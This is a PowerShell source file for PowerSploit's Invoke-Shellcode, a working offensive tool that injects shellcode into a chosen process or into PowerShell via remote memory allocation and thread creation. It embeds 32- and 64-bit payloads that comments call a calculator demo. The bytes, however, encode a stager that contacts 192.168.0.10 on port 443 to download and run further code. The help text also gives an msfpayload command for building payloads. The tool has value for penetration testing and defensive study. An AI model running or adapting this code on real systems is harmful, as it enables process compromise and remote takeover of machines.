function Invoke-Shellcode
{
<#
.SYNOPSIS

Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre

PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):

msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 

Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
 
.PARAMETER ProcessID

Process ID of the process you want to inject shellcode into.

.PARAMETER Shellcode

Specifies an optional shellcode passed in as a byte array

.PARAMETER Force

Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.

.EXAMPLE

C:\PS> Invoke-Shellcode -ProcessId 4274

Description
-----------
Inject shellcode into process ID 4274.

.EXAMPLE

C:\PS> Invoke-Shellcode

Description
-----------
Inject shellcode into the running instance of PowerShell.

.EXAMPLE

C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
    
Description
-----------
Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
#>

[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Ensure a valid process ID was provided
        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  RAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  EAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  EAX
        }
        
        Write-Output $CallStub
    }

    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        # Open a handle to the process you want to inject into
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ($64bitOS) # Only perform theses checks if CPU is 64-bit
        {
            # Determine if the process specified is 32 or 64 bit
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }
                
                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else # 64-bit process
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }
                
                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else # 32-bit CPU
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        # Reserve and commit enough memory in remote process to hold the shellcode
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode into the previously allocated memory
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate inline assembly stub
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Write 32-bit assembly stub to remote process memory space
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        # Execute shellcode as a remote thread
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        # Close process handle
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }
            
            $Shellcode = $Shellcode64
            Write-Verbose 'Using 64-bit shellcode.'
        }
    
        # Allocate RWX memory for the shellcode
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$BaseAddress)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
        
        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate RWX memory for the thread call stub
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$CallStubAddress)
        {
            Throw "Unable to allocate thread call stub."
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy call stub to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        # Launch shellcode in it's own thread
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        # Wait for shellcode thread to terminate
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

        Write-Verbose 'Shellcode injection complete!'
    }

    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    $AddressWidth = $null

    try {
        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
    } catch {
        throw 'Unable to determine OS processor address width.'
    }

    switch ($AddressWidth) {
        '32' {
            $64bitOS = $False
        }

        '64' {
            $64bitOS = $True

            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        }

        default {
            throw 'Invalid OS address width detected.'
        }
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PSBoundParameters['Shellcode'])
    {
        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    else
    {
        # Pop a calc... or whatever shellcode you decide to place in here
        # I sincerely hope you trust that this shellcode actually pops a calc...
        # Insert your shellcode here in the for 0xXX,0xXX,...
        # 32-bit payload
        # msfpayload 
        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31
				0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52
				0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff
				0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd
				0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b
				0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1
				0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3
				0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac
				0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3
				0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58
				0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c
				0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24
				0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f
				0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65
				0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c
				0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53
				0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53
				0x53,0x6a,0x3,0x53,0x53,0x68,0xbb,0x1,0x0,0x0
				0xe8,0xf9,0x0,0x0,0x0,0x2f,0x45,0x31,0x54,0x30
				0x51,0x76,0x4a,0x61,0x37,0x50,0x6a,0x74,0x61,0x75
				0x78,0x72,0x75,0x75,0x44,0x36,0x41,0x41,0x7a,0x78
				0x35,0x76,0x6b,0x4e,0x46,0x4b,0x4e,0x71,0x70,0x75
				0x46,0x2d,0x68,0x4e,0x4e,0x42,0x73,0x4b,0x71,0x4b
				0x6a,0x47,0x4a,0x42,0x4a,0x33,0x70,0x70,0x43,0x30
				0x4d,0x4a,0x75,0x69,0x42,0x33,0x61,0x53,0x50,0x71
				0x6d,0x31,0x4c,0x75,0x72,0x75,0x61,0x4a,0x7a,0x33
				0x77,0x5a,0x72,0x35,0x63,0x78,0x73,0x75,0x62,0x49
				0x45,0x51,0x48,0x38,0x58,0x4b,0x6d,0x48,0x62,0x6e
				0x56,0x38,0x39,0x39,0x71,0x4c,0x37,0x41,0x75,0x7a
				0x43,0x78,0x49,0x6d,0x49,0x53,0x64,0x43,0x31,0x79
				0x42,0x35,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff
				0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe0,0x84,0x53
				0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b
				0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0
				0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68
				0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53
				0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0
				0x75,0x8,0x4f,0x75,0xd9,0xe8,0x49,0x0,0x0,0x0
				0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0
				0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5
				0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0
				0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5
				0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0
				0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff
				0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e
				0x31,0x30,0x0,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0
				0x53,0xff,0xd5)

        # 64-bit payload
        # msfpayload 
        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0
				0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2
				0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48
				0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7
				0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c
				0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41
				0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52
				0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78
				0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b
				0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67
				0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40
				0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41
				0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48
				0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1
				0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45
				0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49
				0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40
				0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1
				0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58
				0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52
				0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9
				0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49
				0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41
				0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26
				0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a
				0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba
				0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5
				0xe8,0xd,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31
				0x36,0x38,0x2e,0x30,0x2e,0x31,0x30,0x0,0x5a,0x48
				0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d
				0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57
				0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8
				0x75,0x0,0x0,0x0,0x2f,0x53,0x36,0x47,0x68,0x50
				0x47,0x2d,0x5a,0x70,0x34,0x7a,0x5f,0x50,0x66,0x34
				0x5f,0x71,0x4c,0x66,0x6d,0x32,0x67,0x46,0x61,0x76
				0x58,0x2d,0x4f,0x6e,0x36,0x64,0x39,0x79,0x67,0x50
				0x4f,0x6d,0x74,0x55,0x79,0x33,0x34,0x6d,0x44,0x74
				0x37,0x70,0x42,0x50,0x76,0x52,0x38,0x62,0x69,0x74
				0x30,0x77,0x56,0x53,0x64,0x6c,0x4e,0x43,0x69,0x6f
				0x6f,0x42,0x6e,0x6b,0x6f,0x4b,0x6e,0x6f,0x46,0x69
				0x36,0x65,0x2d,0x58,0x69,0x6b,0x68,0x45,0x75,0x71
				0x6c,0x6b,0x38,0x30,0x66,0x53,0x65,0x51,0x5a,0x36
				0x57,0x62,0x39,0x70,0x6f,0x6e,0x50,0x37,0x33,0x54
				0x33,0x62,0x39,0x62,0x39,0x58,0x63,0x50,0x67,0x6d
				0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31
				0xc9,0x53,0x48,0xb8,0x0,0x32,0xa0,0x84,0x0,0x0
				0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55
				0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f
				0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33
				0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49
				0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff
				0xd5,0x48,0x89,0xf1,0x53,0x5a,0x4d,0x31,0xc0,0x4d
				0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18
				0x7b,0xff,0xd5,0x85,0xc0,0x75,0xc,0x48,0xff,0xcf
				0x74,0x2,0xeb,0xc0,0xe8,0x56,0x0,0x0,0x0,0x53
				0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10
				0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58
				0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48
				0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48
				0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49
				0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0
				0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0
				0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0
				0x75,0xd2,0x58,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49
				0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5)
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Inject shellcode into the specified process ID
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose "Injecting shellcode into PID: $ProcessId"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }
    else
    {
        # Inject shellcode into the currently running PowerShell process
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose "Injecting shellcode into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode into the running PowerShell process!" ) )
        {
            Inject-LocalShellcode
        }
    }   
}
